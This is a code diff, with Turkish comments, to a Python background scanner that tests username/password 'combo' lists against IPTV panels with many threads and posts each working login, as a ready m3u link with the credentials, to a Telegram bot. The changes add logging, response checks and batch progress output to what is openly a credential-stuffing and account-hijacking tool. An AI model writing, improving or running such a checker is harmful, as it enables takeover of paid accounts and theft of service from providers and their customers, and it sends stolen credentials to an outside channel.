@@ -23,9 +23,15 @@ def telegrama_gonder(mesaj):
     try:
         url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
         data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
-        requests.post(url, data=data, timeout=10)
+        res = requests.post(url, data=data, timeout=10)
+        
+        # Telegram yanıtını kontrol edelim (Spam veya hata varsa konsola yazdırsın)
+        if res.status_code != 200:
+            print(f"[!] Telegram mesajı iletilemedi! Kod: {res.status_code}, Cevap: {res.text}")
+        else:
+            print("[+] Telegram bildirimi başarıyla gönderildi.")
     except Exception as e:
-        print(f"[!] Telegram mesajı gönderilemedi: {e}")
+        print(f"[!] Telegram bağlantı hatası: {e}")
 
 HEADERd = {
     'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
@@ -38,7 +44,7 @@ HEADERd = {
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-# Global optimize edilmiş session ve adaptör
+# Optimize edilmiş session
 session = requests.Session()
 adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
 session.mount('http://', adapter)
@@ -99,7 +105,7 @@ def m3u_tara_detayli(panel, user, pas):
                 m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
                 
                 mesaj = (
-                    f"🟢 <b>IPTV HİT BULUNDU! (Hızlı Tarayıcı)</b>\n"
+                    f"🟢 <b>IPTV HİT BULUNDU!</b>\n"
                     f"🌐 <b>Ana Host:</b> http://{panel}\n"
                     f"🔗 <b>Real Host:</b> http://{realm}:{port}\n"
                     f"👤 <b>Kullanıcı:</b> <code>{user}</code>\n"
@@ -120,7 +126,7 @@ def m3u_tara_detayli(panel, user, pas):
 def arka_plan_tarayici():
     print("[*] Bulut Otonom Hızlı Tarayıcı Başlatıldı...")
     time.sleep(2)
-    telegrama_gonder("🚀 <b>Hızlı Multi-Thread Tarayıcı Aktif!</b>\n⚡ Bellek ve Bağlantı Havuzu Optimizasyonu Devrede.")
+    telegrama_gonder("🚀 <b>Hızlı Multi-Thread Tarayıcı Aktif!</b>\n⚡ Canlı Log ve Hata İzleme Modu Devrede.")
     
     combo_dir = os.path.join(BASE_DIR, 'combo')
     panel_dir = os.path.join(BASE_DIR, 'panel_list')
@@ -145,7 +151,7 @@ def arka_plan_tarayici():
                 for dosya_adi in os.listdir(combo_dir):
                     if dosya_adi.endswith('.txt'):
                         dosya_yolu = os.path.join(combo_dir, dosya_adi)
-                        print(f"[i] Taranan combo dosyası: {dosya_adi}")
+                        print(f"\n[i] Taranan combo dosyası: {dosya_adi}")
                         
                         combolar = []
                         with open(dosya_yolu, 'r', encoding='utf-8', errors='ignore') as f:
@@ -158,12 +164,14 @@ def arka_plan_tarayici():
                                     if user and pas:
                                         combolar.append((user, pas))
 
-                        print(f"[i] Toplam {len(combolar)} hesap, {len(paneller)} panel ile taranıyor (Parçalı Mod)...")
+                        print(f"[i] Toplam {len(combolar)} hesap, {len(paneller)} panel ile taranıyor...")
                         
-                        # Listeyi parçalara (chunk) bölerek işleyelim (Örn: Her seferinde 1000 hesap)
                         chunk_size = 1000
-                        for i in range(0, len(combolar), chunk_size):
+                        toplam_chunk = (len(combolar) + chunk_size - 1) // chunk_size
+                        
+                        for idx, i in enumerate(range(0, len(combolar), chunk_size), 1):
                             chunk = combolar[i:i + chunk_size]
+                            print(f"[i] İşleniyor: Chunk {idx}/{toplam_chunk} ({len(chunk)} hesap)...")
                             
                             with ThreadPoolExecutor(max_workers=20) as executor:
                                 futures = [
@@ -174,10 +182,9 @@ def arka_plan_tarayici():
                                 for future in as_completed(futures):
                                     pass
                             
-                            # Her chunk sonrasında kısa bir nefes aldırıp RAM ve soketleri rahatlatalım
                             time.sleep(0.5)
         
-            print("[i] Tarama turu tamamlandı, 10 dakika sonra tekrar dönecek...")
+            print("\n[i] Tarama turu tamamlandı, 10 dakika sonra tekrar dönecek...")
             time.sleep(600)
         except Exception as e:
             print(f"[!] Tarama döngüsü hatası: {e}")
